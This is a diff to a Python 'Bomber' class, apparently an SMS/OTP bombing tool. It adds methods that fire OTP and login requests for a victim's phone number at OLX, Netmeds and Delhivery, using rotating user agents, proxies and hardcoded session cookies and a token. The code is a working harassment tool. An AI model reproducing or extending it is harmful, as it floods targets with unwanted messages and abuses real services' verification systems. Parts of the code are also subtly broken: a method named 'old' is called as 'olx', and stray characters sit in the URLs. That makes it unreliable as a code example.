@@ -419,7 +419,7 @@ class Bomber:
             'sec-fetch-dest': "empty",
             'sec-fetch-mode': "cors",
             'sec-fetch-site': "same-origin",
-            'user-agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36",
+            "user-agent": self.getUserAgent(),
             'x-frsc-token': "9838214a8d42cb7d4b9c943336c3c3801474f6a9ac56a6872508c66c1e2d45e6",
             'x-requested-with': "XMLHttpRequest"
         }
@@ -686,7 +686,7 @@ class Bomber:
             'sec-fetch-mode': "cors",
             'sec-fetch-site': "same-origin",
             'token': "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXZpY2VfaWQiOiJ5QmtjTDdQQnF4aUZrWk5OSUgiLCJtb2RlX2RldmljZSI6ImRlc2t0b3AiLCJtb2RlX2RldmljZV90eXBlIjoid2ViIiwiaWF0IjoxNjU0NTY4NTkzLCJleHAiOjE2NjIzNDQ1OTMsImF1ZCI6IndlYiIsImlzcyI6InRva2VubWljcm9zZXJ2aWNlIn0.37ogWye7izJR0L7CUML80JmEyrcwlkhKcsBbWO5npKA",
-            'user-agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36"
+            "user-agent": self.getUserAgent()
         }
         try:
             request = requests.request("GET", url, data=payload, headers=headers, params=querystring, proxies={
@@ -768,10 +768,87 @@ class Bomber:
             'sec-fetch-dest': "empty",
             'sec-fetch-mode': "cors",
             'sec-fetch-site': "same-site",
-            'user-agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36"
+            "user-agent": self.getUserAgent()
         }
         try:
             request = requests.request("POST", url, data=payload, headers=headers, proxies={
+                'https': self.getproxy()})
+        except:
+            return False
+        if(request.status_code == 400):
+            return True
+
+    def old(self):
+        url = "https://www.olx.in/api/auth/authenticate"
+
+        querystring = {"lang": "en-IN"}
+        payload = "{\"grantType\":\"phone\",\"phone\":"f'"{self.user_mobile}"'",\"language\":\"en-IN\"}"
+        headers = {
+            'cookie': "lqonap=1813c1be554x542d3d0a; laquesis=pan-59446@b#pan-60601@b; laquesisff=pan-36788#pan-38000#pan-42665; lqstatus=1654572070; bm_sz=479AD855001B2BAAD2977B4AEBAE31DE~YAAQn/hWuMsgwzeBAQAAKucbPBCjgWjGz7O9ymrtzTbNLTtJUP0qP8gW2YLG2LoH140ZVidDTTHP3K4PfQ6gcynWG5j67zKzu2b7MZebBiEyL51cOVsN7VrjXmhhuePiPOY6WkNbt9xP84wF7VziLRYgKExU3N+jzN0dmZwaQWVGe13iBSe8VGltuwayc7Ca94MwqFMybwkbhS/fR1coLWzS92qzUDMQ7UfC6l+q4VED3ZEGTZQNUKW4xjfTV2X/9HeRfyv6VoPFqYLp/kK5XdmczaNSWUsxAzv+/m002A==~3158070~3160370; ak_bmsc=C888B111D0FEFF127FAFB6D85AB9384E~000000000000000000000000000000~YAAQn/hWuPcgwzeBAQAA/u0bPBDbu72L3PEwiG7WnkIPLWwGa+iLAIW6yEZ/prb+RKw9KTGmBlI4tGvGAGEcb5MXuZa49X0mxvfa9XzsAI/M3DDzSSyx8YmBzdssuowg4EA/l/qrykGNdLM76w1K4nYntTIE65NRbHQ/K3ME+4CdP1lvxZr4Ihv4FuS8hA03jvc5CMGZdKyRrMwRJHGIsSfM2vE1Xcj8mCrTYVtJEReaKQguERQp2MJxiNBCtaZopEB3NfAck+SDxmnaLLEzNw9jS4Unh7C2QpkKh06LcFVmaHnOdWAsS1uVfvIGBQSiKLnUMhH1MjGsP6+7nHqrf5qA44GLAuIwsGlM+O14VYOSx2LJ1LS7k700AjVMrhfPly+GnLgPNIfsX/S24vgtbTP3JeoVrlf/hT4B1mt5U2eeHAIE+Ys3Jhi/1F/TIGBXIXXcWedQUTAw7pjFF1dZFzbld1OjdGN5tgNzza7qXCuUFJGgKJdfXiQ=; _abck=91F415F48AD0C8F9523A83EF0C9341B7~0~YAAQn/hWuDkhwzeBAQAAqfwbPAgwOqnIDpNXjIy0KgsrXpufzoTZq9gyGwUwcfl0P6j63sfNdQrzQI3M3mOU02lsQ89H1dS0gc3wCTeCocytn86EJnTyKbfK1bN1U6JdJ2BukgVVeIAolwc9FaVQS59Cp7O62WskowogrtNxEMSlo2gAMCrJjr7LYXtmbeV83CClolbboCh4jtXk9cV+jr1xgr6fWkzM1Ww6rR2qrxA6T74pql9MwvfEpN48MPFksKHOwFKIc8KUAIjUM8JZ8g4QFHYy/U+PD0bza3IBkm9FISuJifPfy9pQtI8h7KAKAEm1ofJOKo+9pXxs9wx8eZXaj0Hp2q7NNMe1+y5DladlwMBSKZ7keLzStl/ekwrzj3IY+hPXuwXnX7CrjsJejN79nbc=~-1~||-1||~-1; g_state={\"i_p\":1654578077713,\"i_l\":1}; G_ENABLED_IDPS=google; bm_sv=401D1516221E4DA25DE42FC074189694~YAAQn/hWuNwiwzeBAQAAWCkcPBA8Ii6R/ISyuJywGQK2TcVaoNgpPpWCyiukbXgZf8ekif8WxICpsTPVOYFAV1B3Pq1AgG+NxY6bvDb1XMpHeNHJQSLnzsv/vY8VbSzZFBfRzIIMtBtxjvDoiF1wMLmasPKOA6zqfF3J3kKlc/WrSkaWyQSSPUzDJDo5Rqz/Sak+7BW6E2ZTnV/iWzSfFthMdPDAaE5u6Uv4JaaDro9aeHsMNlI/12f2EB/vH6+8~1",
+            'authority': "www.olx.in",
+            'accept': "*/*",
+            'accept-language': "en-US,en;q=0.9",
+            'content-type': "application/json",
+            'dnt': "1",
+            'origin': "https://www.olx.in",
+            'referer': "https://www.olx.in/",
+            'sec-fetch-dest': "empty",
+            'sec-fetch-mode': "cors",
+            'sec-fetch-site': "same-origin",
+            "user-agent": self.getUserAgent(),
+            'x-newrelic-id': "VQMGU1ZVDxABU1lbBgMDUlI=",
+            'x-panamera-fingerprint': "5b11d8411c6795feaaed58c0f5c6f034#1654570871207"
+        }
+        try:
+            request = requests.request("POST", url, data=payload, headers=headers, proxies={
+                'https': self.getproxy()})
+        except:
+            return False
+        if(request.status_code == 400):
+            return True
+
+    def netmeds(self):
+        url = f"https://m.netmeds.com/mst/rest/v1/id/details/f{self.user_mobile}"
+
+        payload = ""
+        headers = {
+            'authority': "m.netmeds.com",
+            'accept': "application/json, text/plain, */*",
+            'accept-language': "en-US,en;q=0.9",
+            'cookie': "_nmsAttr=ADW-CPC-Search-NMS-Brand-NC; _nmsSource=ADW-CPC-Search-NMS-Brand-NC; _nmsMedium=CPC; _nmsCampaign=ADW-CPC-Search-NMS-Brand-NC; _nmsUTMtrackingsource=ADW-CPC-Search-NMS-Brand-NC%26ADW-CPC-Search-NMS-Brand-NC%26CPC%26ADW-CPC-Search-NMS-Brand-NC; _nmstracking=ADW-CPC-Search-NMS-Brand-NC; _ALGOLIA=anonymous-26efba08-3a50-45ca-9bc8-9669a6e032b7; _gcl_aw=GCL.1654570457.CjwKCAjwy_aUBhACEiwA2IHHQFC9wdAdVdN13-AsEtt92vpCazF9gu7QosyIhHttIahwcfS9IW2Z4hoC1msQAvD_BwE; _gcl_au=1.1.2112317680.1654570457; nms_mgo_pincode=110002; nms_mgo_city=Central%20Delhi; nms_mgo_state_code=DL; nms_mgo_state_name=Delhi; _ga=GA1.3.891037540.1654570457; _gid=GA1.3.838617024.1654570457; _gat_UA-63910444-1=1; _gid=GA1.2.838617024.1654570457; _gac_UA-63910444-1=1.1654570458.CjwKCAjwy_aUBhACEiwA2IHHQFC9wdAdVdN13-AsEtt92vpCazF9gu7QosyIhHttIahwcfS9IW2Z4hoC1msQAvD_BwE; _gac_UA-63910444-1=1.1654570458.CjwKCAjwy_aUBhACEiwA2IHHQFC9wdAdVdN13-AsEtt92vpCazF9gu7QosyIhHttIahwcfS9IW2Z4hoC1msQAvD_BwE; _gat=1; liteprompt=disabled; _uetsid=1ef357c0e60d11ec98f3bfaec136b2f9; _uetvid=1ef3e6c0e60d11ec86c397e1ca7bf06e; _ga_ZD1BC704WF=GS1.1.1654570456.1.1.1654570481.35; G_ENABLED_IDPS=google; _ga=GA1.2.891037540.1654570457",
+            'dnt': "1",
+            'referer': "https://m.netmeds.com/customer/account/login",
+            'sec-fetch-dest': "empty",
+            'sec-fetch-mode': "cors",
+            'sec-fetch-site': "same-origin",
+            "user-agent": self.getUserAgent()
+        }
+        try:
+            request = requests.request("GET", url, data=payload, headers=headers, proxies={
+                'https': self.getproxy()})
+        except:
+            return False
+        if(request.status_code == 400):
+            return True
+
+    def delhivery(self):
+        url = f"https://dlv-api.delhivery.com/client-profile/otp/generate/+91f{self.user_mobile}"
+
+        payload = ""
+        headers = {
+            'authority': "dlv-api.delhivery.com",
+            'accept': "application/json, text/plain, */*",
+            'accept-language': "en",
+            'dnt': "1",
+            'origin': "https://www.delhivery.com",
+            'referer': "https://www.delhivery.com/",
+            'sec-fetch-dest': "empty",
+            'sec-fetch-mode': "cors",
+            'sec-fetch-site': "same-site",
+            "user-agent": self.getUserAgent()
+        }
+        try:
+            request = requests.request("GET", url, data=payload, headers=headers, proxies={
                 'https': self.getproxy()})
         except:
             return False
@@ -842,7 +919,11 @@ class Bomber:
                     counter += 1
                 if self.eka():
                     counter += 1
-                if self.meesho():
+                if self.olx():
+                    counter += 1
+                if self.netmeds():
+                    counter += 1
+                if self.delhivery():
                     counter += 1
 
                 if(counter >= self.number_of_messege):
